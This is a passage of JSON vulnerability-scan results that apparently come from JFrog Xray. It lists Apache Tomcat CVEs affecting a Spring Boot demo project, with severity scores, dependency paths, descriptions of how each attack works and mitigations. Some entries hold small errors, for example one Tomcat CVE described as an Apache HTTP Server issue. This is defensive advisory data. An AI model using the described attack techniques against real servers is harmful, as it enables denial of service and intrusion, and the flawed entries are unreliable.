        "summary": "Denial of Service due to improper input validation vulnerability for HTTP/2 requests in Apache Tomcat. When processing an HTTP/2 request, if the request exceeded any of the configured limits for headers, the associated HTTP/2 stream was not reset until after all of the headers had been processed.This issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.0-M16, from 10.1.0-M1 through 10.1.18, from 9.0.0-M1 through 9.0.85, from 8.5.0 through 8.5.98.\n\nUsers are recommended to upgrade to version 11.0.0-M17, 10.1.19, 9.0.86 or 8.5.99 which fix the issue.",
        "severity": "High",
        "components": {
          "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83": {
            "fixed_versions": [
              "[10.1.19]",
              "[11.0.0-M17]",
              "[8.5.99]",
              "[9.0.86]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-tomcat:2.7.18"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-tomcat:2.7.18"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-websocket:9.0.83"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-593658",
        "references": [
          "https://lists.apache.org/thread/4c50rmomhbbsdgfjsgwlb51xdwfjdcvg",
          "https://github.com/apache/tomcat/commit/d07c82194edb69d99b438828fe2cbfadbb207843",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/3UWIS5MMGYDZBLJYT674ZI5AWFHDZ46B/",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/736G4GPZWS2DSQO5WKXO3G6OMZKFEK55",
          "https://github.com/apache/tomcat/commit/8e03be9f2698f2da9027d40b9e9c0c9429b74dc0",
          "https://security.netapp.com/advisory/ntap-20240402-0002/",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/3UWIS5MMGYDZBLJYT674ZI5AWFHDZ46B",
          "https://github.com/apache/tomcat/commit/0cac540a882220231ba7a82330483cbd5f6b1f96",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/736G4GPZWS2DSQO5WKXO3G6OMZKFEK55/",
          "https://security.netapp.com/advisory/ntap-20240402-0002",
          "https://lists.debian.org/debian-lts-announce/2024/04/msg00001.html",
          "https://nvd.nist.gov/vuln/detail/CVE-2024-24549",
          "http://www.openwall.com/lists/oss-security/2024/03/13/3",
          "https://github.com/apache/tomcat/commit/810f49d5ff6d64b704af85d5b8d0aab9ec3c83f5",
          "https://github.com/advisories/GHSA-7w75-32cg-r6g2"
        ],
        "extended_information": {
          "short_description": "A design problem in the implementation of the HTTP/2 protocol in Apache Tomcat Http2Parser may lead to denial of service by abusing frame flags.",
          "full_description": "[Apache Tomcat](https://tomcat.apache.org/) is an open source implementation of multiple parts of the Jakarta EE platform (Which is the evolution of the Java EE platform). Tomcat acts as a Java HTTP web application server, although it is not a full JEE application server.\n`HTTP/2` is a binary protocol where the client and server exchange binary frames instead of text lines as in `HTTP/1.x`. `HTTP/2` resolves numerous concerns found in HTTP/1.1 by organizing each HTTP message into a series of HTTP/2 frames. These frames include frame type, length, flags, stream identifier (ID), and payload.\n\nThe `HEADERS` frame type allows sending HTTP headers of, both, request and response. The `HEADERS` frame contains many flags.\nThe `CONTINUATION` frame type is similar to the `HEADER` frame, but it has just one flag: `END_HEADERS`. When it is not set, the peer knows that more headers are coming in the following `CONTINUATION` frames.\n\nThis mechanism allows an attacker to send an `HTTP/2` stream with `CONTINUATION` frames, without setting the `END_HEADERS` flag in any of the frames. This can cause denial-of-service when sending an excessive number of these crafted frames due to caching all frames in memory.\n\nApache Tomcat must enable `HTTP/2` in its configuration for the vulnerability to be exploitable, which is not the default.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue has multiple mentions in general media",
              "description": "This issue is related to the well-covered attack \"HTTP/2 CONTINUATION Flood\"."
            },
            {
              "name": "The issue can be exploited by attackers over the network"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "Apache Tomcat must be configured to use HTTP/2 to be vulnerable.",
              "is_positive": true
            },
            {
              "name": "The issue has a detailed technical explanation published, that can aid in exploit development",
              "description": "A technical write-up has been published regarding the issue."
            }
          ]
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2025-46701",
            "cvss_v3_score": "7.3",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
            "cwe": [
              "CWE-178"
            ]
          }
        ],
        "summary": "Improper Handling of Case Sensitivity vulnerability in Apache Tomcat's GCI servlet allows security constraint bypass of security constraints that apply to the pathInfo component of a URI mapped to the CGI servlet.\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.6, from 10.1.0-M1 through 10.1.40, from 9.0.0.M1 through 9.0.104.\nThe following versions were EOL at the time the CVE was created but are \nknown to be affected: 8.5.0 though 8.5.100. Other, older, EOL versions \nmay also be affected.\n\n\nUsers are recommended to upgrade to version 11.0.7, 10.1.41 or 9.0.105, which fixes the issue.",
        "severity": "Low",
        "components": {
          "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83": {
            "fixed_versions": [
              "[10.1.41]",
              "[11.0.7]",
              "[9.0.105]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-tomcat:2.7.18"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-tomcat:2.7.18"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-websocket:9.0.83"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-703041",
        "references": [
          "https://lists.apache.org/thread/xhqqk9w5q45srcdqhogdk04lhdscv30j",
          "https://github.com/apache/tomcat/commit/8df00018a252baa9497615d6420fb6c10466fa74",
          "https://tomcat.apache.org/security-10.html#Fixed_in_Apache_Tomcat_10.1.41",
          "http://www.openwall.com/lists/oss-security/2025/05/29/4",
          "https://github.com/apache/tomcat/commit/fab7247d2f0e3a29d5daef565f829f383e10e5e2",
          "https://nvd.nist.gov/vuln/detail/CVE-2025-46701",
          "https://github.com/apache/tomcat/commit/238d2aa54b99f91d1111467e2237d2244c64e558",
          "https://github.com/apache/tomcat/commit/0f01966eb60015d975525019e12a087f05ebf01a",
          "https://github.com/advisories/GHSA-h2fw-rfh5-95r3",
          "https://github.com/apache/tomcat/commit/2c6800111e7d8d8d5403c07978ea9bff3db5a5a5",
          "https://github.com/apache/tomcat/commit/8cb95ff03221067c511b3fa66d4f745bc4b0a605",
          "https://tomcat.apache.org/security-9.html#Fixed_in_Apache_Tomcat_9.0.105",
          "https://tomcat.apache.org/security-11.html#Fixed_in_Apache_Tomcat_11.0.7"
        ],
        "extended_information": {
          "short_description": "Improper Handling in the CGI servlet in Apache Tomcat on case-insensitive filesystems leads to a filter bypass bypass by network attackers using crafted URL requests.",
          "full_description": "[Apache Tomcat](https://tomcat.apache.org/) is an open source implementation of multiple parts of the Jakarta EE platform (Which is the evolution of the Java EE platform). Tomcat acts as a Java HTTP web application server, although it is not a full JEE application server.\n[CGI](https://tomcat.apache.org/tomcat-9.0-doc/cgi-howto.html) (Common Gateway Interface) defines a way for a web server to interact with external content-generating programs, which are often referred to as CGI programs or CGI scripts.\n\nWithin Tomcat, CGI support can be added when using Tomcat as an HTTP server and CGI support is required. Typically this is done during development when when running a full production web server like Apache httpd is unwanted. Tomcat's CGI support is largely compatible with Apache httpd's, but there are some limitations (e.g., only one cgi-bin directory).\n\nTomcat supports setting security constraints, for example the following constraint set in `web.xml` would only allow administrators access to files under `/CGI-bin/` -\n\n``\n\u003csecurity-constraint\u003e\n  \u003cweb-resource-collection\u003e\n    \u003cweb-resource-name\u003eRestricted CGI\u003c/web-resource-name\u003e\n    \u003curl-pattern\u003e/cgi-bin/*\u003c/url-pattern\u003e\n  \u003c/web-resource-collection\u003e\n  \u003cauth-constraint\u003e\n    \u003crole-name\u003eadmin\u003c/role-name\u003e\n  \u003c/auth-constraint\u003e\n\u003c/security-constraint\u003e\n``\n\nThe vulnerability was caused by improper handling of case sensitivity in Apache Tomcat.\nFor those CGI running on case-insensitive directory, both `servletPath` and `pathInfo` were exploit targets of CGIServlet. \n\nNormally, CGI Servlets are URL-mapped to `/cgi-bin/*`.\nGiven a protected (security-constraint enforced) cgi script URL: `https://victim-website/cgi-bin/script.pl` an attacker could bypass the URL restriction by surfing to (for example) -  `https://victim-website/cgi-bin/SCRIPT.pl` which would obtain the same resource (`script.pl`).",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue can be exploited by attackers over the network",
              "description": "Possible exploit with PUT request"
            },
            {
              "name": "The issue has an exploit published",
              "description": "Report description with PoC https://github.com/gregk4sec/CVE-2025-46701/blob/main/CVE-2025-46701-PoC.md"
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "Production servers are not likely to use Apache Tomcat's CGI support, which is disabled by default",
              "is_positive": true
            }
          ]
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-34750",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-755",
              "CWE-400"
            ]
          }
        ],
        "summary": "Improper Handling of Exceptional Conditions, Uncontrolled Resource Consumption vulnerability in Apache Tomcat. When processing an HTTP/2 stream, Tomcat did not handle some cases of excessive HTTP headers correctly. This led to a miscounting of active HTTP/2 streams which in turn led to the use of an incorrect infinite timeout which allowed connections to remain open which should have been closed.\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.0-M20, from 10.1.0-M1 through 10.1.24, from 9.0.0-M1 through 9.0.89.\n\nThe following versions were EOL at the time the CVE was created but are \nknown to be affected: 8.5.0 though 8.5.100.\n\n\nUsers are recommended to upgrade to version 11.0.0-M21, 10.1.25 or 9.0.90, which fixes the issue.",
        "severity": "High",
        "components": {
          "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83": {
            "fixed_versions": [
              "[10.1.25]",
              "[11.0.0-M21]",
              "[9.0.90]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-tomcat:2.7.18"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-tomcat:2.7.18"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-websocket:9.0.83"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-610348",
        "references": [
          "https://security.netapp.com/advisory/ntap-20240816-0004/",
          "https://tomcat.apache.org/security-10.html",
          "https://github.com/apache/tomcat/commit/9fec9a82887853402833a80b584e3762c7423f5f",
          "https://nvd.nist.gov/vuln/detail/CVE-2024-34750",
          "https://lists.apache.org/thread/4kqf0bc9gxymjc2x7v3p7dvplnl77y8l",
          "https://github.com/apache/tomcat/commit/2afae300c9ac9c0e516e2e9de580847d925365c3",
          "https://tomcat.apache.org/security-9.html",
          "https://tomcat.apache.org/security-11.html",
          "https://github.com/advisories/GHSA-wm9w-rjj3-j356",
          "https://github.com/apache/tomcat/commit/2344a4c0d03e307ba6b8ab6dc8b894cc8bac63f2",
          "https://security.netapp.com/advisory/ntap-20240816-0004"
        ],
        "extended_information": {
          "short_description": "A design problem in the implementation of the HTTP/2 protocol in Apache HTTP Server may lead to denial of service when using the async servlet.",
          "full_description": "[Apache Tomcat](https://tomcat.apache.org/) is an open source implementation of multiple parts of the Jakarta EE platform (Which is the evolution of the Java EE platform). Tomcat acts as a Java HTTP web application server, although it is not a full JEE application server.\n`HTTP/2` is a binary protocol where the client and server exchange binary frames instead of text lines as in `HTTP/1.x`. `HTTP/2` resolves numerous concerns found in HTTP/1.1 by organizing each HTTP message into a series of HTTP/2 frames. These frames include frame type, length, flags, stream identifier (ID), and payload.\n\nDuring an `HTTP/2` async request, no exception is reported when the client closes the connection before the server could fully read the request. Therefore, the connection will be left open, which could lead to denial of service.\n\nThe Apache HTTP Server must have the `http2` module enabled for the vulnerability to be exploitable, which is not the default.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue can be exploited by attackers over the network"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The Apache HTTP Server must have the `http2` module enabled for the vulnerability to be exploitable, which is not the default.",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This issue can lead to denial of service when using the `HTTP/2` protocol."
            }
          ]
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2025-24813",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-44",
              "CWE-706",
              "CWE-502"
            ]
          }
        ],
        "summary": "Path Equivalence: 'file.Name' (Internal Dot) leading to Remote Code Execution and/or Information disclosure and/or malicious content added to uploaded files via write enabled Default Servlet in Apache Tomcat.\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.2, from 10.1.0-M1 through 10.1.34, from 9.0.0.M1 through 9.0.98.\nThe following versions were EOL at the time the CVE was created but are \nknown to be affected: 8.5.0 though 8.5.100. Other, older, EOL versions \nmay also be affected.\n\n\nIf all of the following were true, a malicious user was able to view       security sensitive files and/or inject content into those files:\n- writes enabled for the default servlet (disabled by default)\n- support for partial PUT (enabled by default)\n- a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads\n- attacker knowledge of the names of security sensitive files being uploaded\n- the security sensitive files also being uploaded via partial PUT\n\nIf all of the following were true, a malicious user was able to       perform remote code execution:\n- writes enabled for the default servlet (disabled by default)\n- support for partial PUT (enabled by default)\n- application was using Tomcat's file based session persistence with the default storage location\n- application included a library that may be leveraged in a deserialization attack\n\nUsers are recommended to upgrade to version 11.0.3, 10.1.35 or 9.0.99, which fixes the issue.",
        "severity": "Critical",
        "components": {
          "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83": {
            "fixed_versions": [
              "[10.1.35]",
              "[11.0.3]",
              "[9.0.99]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-tomcat:2.7.18"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-tomcat:2.7.18"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-websocket:9.0.83"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-676707",
        "references": [
          "https://github.com/absholi7ly/POC-CVE-2025-24813/blob/main/README.md",
          "https://security.netapp.com/advisory/ntap-20250321-0001/",
          "https://www.vicarius.io/vsociety/posts/cve-2025-24813-tomcat-mitigation-vulnerability",
          "https://nvd.nist.gov/vuln/detail/CVE-2025-24813",
          "https://github.com/apache/tomcat/commit/f6c01d6577cf9a1e06792be47e623d36acc3b5dc",
          "https://github.com/apache/tomcat/commit/eb61aade8f8daccaecabf07d428b877975622f72",
          "https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq",
          "http://www.openwall.com/lists/oss-security/2025/03/10/5",
          "https://security.netapp.com/advisory/ntap-20250321-0001",
          "https://github.com/apache/tomcat/commit/0a668e0c27f2b7ca0cc7c6eea32253b9b5ecb29c",
          "https://www.vicarius.io/vsociety/posts/cve-2025-24813-detect-apache-tomcat-rce",
          "https://www.vicarius.io/vsociety/posts/cve-2025-24813-tomcat-detect-vulnerability",
          "https://lists.debian.org/debian-lts-announce/2025/04/msg00003.html",
          "https://www.vicarius.io/vsociety/posts/cve-2025-24813-mitigate-apache-tomcat-rce",
          "https://github.com/advisories/GHSA-83qj-6fr2-vhqg"
        ],
        "extended_information": {
          "short_description": "A design problem in Apache Tomcat may lead to remote code execution when handling partial PUT requests.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue can be exploited by attackers over the network",
              "description": "This vulnerability can be exploited remotely by sending a malicious request to the server."
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "Exploitation of this vulnerability for data leakage requires the following prerequisites:\n1. Writes enabled for the default servlet (disabled by default).\n2. Support for partial PUT (enabled by default).\n3. A target URL for security-sensitive uploads that is a sub-directory of a target URL for public uploads.\n4. Attacker knowledge of the names of security-sensitive files being uploaded.\n5. The security-sensitive files are also being uploaded via partial PUT.\n\nExploitation for code execution requires the following:\n1. Writes enabled for the default servlet (disabled by default).\n2. Support for partial PUT (enabled by default).\n3. The application was using Tomcat's file-based session persistence with the default storage location.\n4. The application included a library that may be leveraged in a deserialization attack.",
              "is_positive": true
            },
            {
              "name": "The issue has an exploit published",
              "description": "The vulnerability has a published PoC."
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "The impact of this vulnerability can be remote code execution or data leakage."
            }
          ],
          "remediation": "##### Development mitigations\n\nThis vulnerability can be mitigated by enabling the `readonly` parameter of the default servlet (which is enabled by default). For example:\n\n```\n\u003cservlet\u003e\n    \u003cservlet-name\u003edefault\u003c/servlet-name\u003e\n    \u003cservlet-class\u003eorg.apache.catalina.servlets.DefaultServlet\u003c/servlet-class\u003e\n    \u003cinit-param\u003e\n        \u003cparam-name\u003ereadonly\u003c/param-name\u003e\n        \u003cparam-value\u003etrue\u003c/param-value\u003e\n    \u003c/init-param\u003e\n\u003c/servlet\u003e\n```\n\nAnother option is to disable partial PUT (enabled by default):\n```\n\u003cservlet\u003e\n    \u003cservlet-name\u003edefault\u003c/servlet-name\u003e\n    \u003cservlet-class\u003eorg.apache.catalina.servlets.DefaultServlet\u003c/servlet-class\u003e\n    \u003cinit-param\u003e\n        \u003cparam-name\u003eallowPartialPut\u003c/param-name\u003e\n        \u003cparam-value\u003efalse\u003c/param-value\u003e\n    \u003c/init-param\u003e\n\u003c/servlet\u003e\n```\n\nA third option, useful only for mitigating the RCE case (so use this only if any of the conditions for data leakage are not met), is changing the configuration of the [Persistent Manager implementation](https://tomcat.apache.org/tomcat-9.0-doc/config/manager.html#:~:text=the%20sessionIdLength%20attribute.-,Persistent%20Manager%20Implementation,-If%20you%20are) to use a custom directory. This can be done through `context.xml`, by adding the `directory` attribute to the `Store` tag and specifying a custom directory:\n```\n\u003cManager className=\"org.apache.catalina.session.PersistentManager\" maxIdleBackup=\"1\" saveOnRestart=\"true\" processExpiresFrequency=\"1\"\u003e\n\t\u003cStore className=\"org.apache.catalina.session.FileStore\" directory=\"...\"/\u003e\n\u003c/Manager\u003e\n```"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-56337",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-367"
            ]
          }
        ],
        "summary": "Time-of-check Time-of-use (TOCTOU) Race Condition vulnerability in Apache Tomcat.\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.1, from 10.1.0-M1 through 10.1.33, from 9.0.0.M1 through 9.0.97.\nThe following versions were EOL at the time the CVE was created but are \nknown to be affected: 8.5.0 though 8.5.100. Other, older, EOL versions \nmay also be affected.\n\n\nThe mitigation for CVE-2024-50379 was incomplete.\n\nUsers running Tomcat on a case insensitive file system with the default servlet write enabled (readonly initialisation \nparameter set to the non-default value of false) may need additional configuration to fully mitigate CVE-2024-50379 depending on which version of Java they are using with Tomcat:\n- running on Java 8 or Java 11: the system property sun.io.useCanonCaches must be explicitly set to false (it defaults to true)\n- running on Java 17: the system property sun.io.useCanonCaches, if set, must be set to false (it defaults to false)\n- running on Java 21 onwards: no further configuration is required (the system property and the problematic cache have been removed)\n\nTomcat 11.0.3, 10.1.35 and 9.0.99 onwards will include checks that sun.io.useCanonCaches is set appropriately before allowing the default servlet to be write enabled on a case insensitive file system. Tomcat will also set sun.io.useCanonCaches to false by default where it can.",
        "severity": "High",
        "components": {
          "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83": {
            "fixed_versions": [
              "[10.1.34]",
              "[11.0.2]",
              "[9.0.98]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-tomcat:2.7.18"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-tomcat:2.7.18"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-websocket:9.0.83"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-661855",
        "references": [
          "https://nvd.nist.gov/vuln/detail/CVE-2024-56337",
          "https://www.cve.org/CVERecord?id=CVE-2024-50379",
          "https://tomcat.apache.org/security-10.html#Fixed_in_Apache_Tomcat_10.1.34",
          "https://github.com/advisories/GHSA-27hp-xhwr-wr2m",
          "https://lists.apache.org/thread/b2b9qrgjrz1kvo4ym8y2wkfdvwoq6qbp",
          "https://tomcat.apache.org/security-11.html#Fixed_in_Apache_Tomcat_11.0.2",
          "https://tomcat.apache.org/security-9.html#Fixed_in_Apache_Tomcat_9.0.98",
          "https://security.netapp.com/advisory/ntap-20250103-0002/",
          "https://security.netapp.com/advisory/ntap-20250103-0002"
        ],
        "extended_information": {
          "short_description": "A race condition in Apache Tomcat may lead to remote code execution when handling JSP files.",
          "full_description": "[Apache Tomcat](https://tomcat.apache.org/) is an open source implementation of multiple parts of the Jakarta EE platform (Which is the evolution of the Java EE platform). Tomcat acts as a Java HTTP web application server, although it is not a full JEE application server.\nApache Tomcat supports `JSP (JavaServer Pages)`, which is a technology that helps create dynamically generated web pages using HTML, XML, and other document types. A JSP file can contain Java code which is run once the file is requested.\n\nNormally, when trying to upload a JSP file, Tomcat blocks the upload and doesn’t compile the JSP. That being said, uploading a file with the extension `.Jsp` (with uppercase `J`) is possible, as Tomcat doesn’t consider it a JSP file.\n\nIn case-insensitive filesystems, however, this behavior might cause problems. Specifically, Tomcat might treat this `.Jsp` file as an actual JSP file, compile it, and execute it. This can happen due to a race condition involving sending concurrent GET and PUT requests to the Tomcat server.\n\nAn attacker may leverage this issue to achieve remote code execution on the server. `CVE-2024-50379` was assigned to this vulnerability and patched, but it was later discovered that the fix was incomplete. `CVE-2024-56337` addresses this issue and relates to the fact that this vulnerability is still exploitable (even in `CVE-2024-50379` fixed versions) if canonical path caching is enabled.\n\nApplications are only vulnerable if they are run in case-insensitive filesystems (such as NTFS in Windows) and if they allow PUT/DELETE requests to the default servlet (`readonly` property disabled, which is not the default setting). In addition, the Java system property `sun.io.useCanonCaches` must be enabled for successful exploitation. This property is enabled by default on Java 8 and Java 11, disabled by default on Java 17, and is removed completely on Java 21 onwards.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "The impact of this vulnerability is remote code execution."
            },
            {
              "name": "The issue can be exploited by attackers over the network",
              "description": "This vulnerability can be exploited remotely by concurrently sending PUT and GET requests to the Tomcat server."
            },
            {
              "name": "The issue has an exploit published",
              "description": "This vulnerability has a published PoC."
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "This vulnerability is only exploitable if the `readonly` property of the default servlet is set to `false`, and if the Tomcat server is run on a case-insensitive filesystem (e.g. NTFS in Windows). In addition, the Java system property `sun.io.useCanonCaches` must be enabled for successful exploitation. This property is enabled by default on Java 8 and Java 11, disabled by default on Java 17, and is removed completely on Java 21 onwards.",
              "is_positive": true
            }
          ],
          "remediation": "##### Development mitigations\n\nDisable the `sun.io.useCanonCaches` Java system property. This can be done by adding `-Dsun.io.useCanonCaches=false` to the JVM parameters when starting Tomcat."
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-50379",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-367"
            ]
          }
        ],
        "summary": "Time-of-check Time-of-use (TOCTOU) Race Condition vulnerability during JSP compilation in Apache Tomcat permits an RCE on case insensitive file systems when the default servlet is enabled for write (non-default configuration).\n\nThis issue affects Apache Tomcat: from 11.0.0-M1 through 11.0.1, from 10.1.0-M1 through 10.1.33, from 9.0.0.M1 through 9.0.97.\n\nThe following versions were EOL at the time the CVE was created but are \nknown to be affected: 8.5.0 though 8.5.100. Other, older, EOL versions may also be affected.\n\nUsers are recommended to upgrade to version 11.0.2, 10.1.34 or 9.0.98, which fixes the issue.",
        "severity": "Critical",
        "components": {
          "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83": {
            "fixed_versions": [
              "[10.1.34]",
              "[11.0.2]",
              "[9.0.98]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-tomcat:2.7.18"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-tomcat:2.7.18"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-websocket:9.0.83"
                },
                {
                  "component_id": "gav://org.apache.tomcat.embed:tomcat-embed-core:9.0.83"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-657841",
        "references": [
          "https://nvd.nist.gov/vuln/detail/CVE-2024-50379",
          "https://tomcat.apache.org/security-11.html#Fixed_in_Apache_Tomcat_11.0.2",
          "https://tomcat.apache.org/security-9.html#Fixed_in_Apache_Tomcat_9.0.98",
          "https://security.netapp.com/advisory/ntap-20250103-0003",
          "https://lists.apache.org/thread/y6lj6q1xnp822g6ro70tn19sgtjmr80r",
          "http://www.openwall.com/lists/oss-security/2024/12/18/2",
          "https://github.com/apache/tomcat/commit/cc7a98b57c6dc1df21979fcff94a36e068f4456c",
          "https://security.netapp.com/advisory/ntap-20250103-0003/",
          "https://github.com/apache/tomcat/commit/631500b0c9b2a2a2abb707e3de2e10a5936e5d41",
          "https://github.com/apache/tomcat/commit/684247ae85fa633b9197b32391de59fc54703842",
          "http://www.openwall.com/lists/oss-security/2024/12/17/4",
          "https://github.com/apache/tomcat/commit/43b507ebac9d268b1ea3d908e296cc6e46795c00",
          "https://github.com/apache/tomcat/commit/8554f6b1722b33a2ce8b0a3fad37825f3a75f2d2",
          "https://github.com/apache/tomcat/commit/05ddeeaa54df1e2dc427d0164bedd6b79f78d81f",
          "https://tomcat.apache.org/security-10.html#Fixed_in_Apache_Tomcat_10.1.34",
          "https://github.com/advisories/GHSA-5j33-cvvr-w245"
        ],
        "extended_information": {
          "short_description": "A race condition in Apache Tomcat may lead to remote code execution when handling JSP files.",
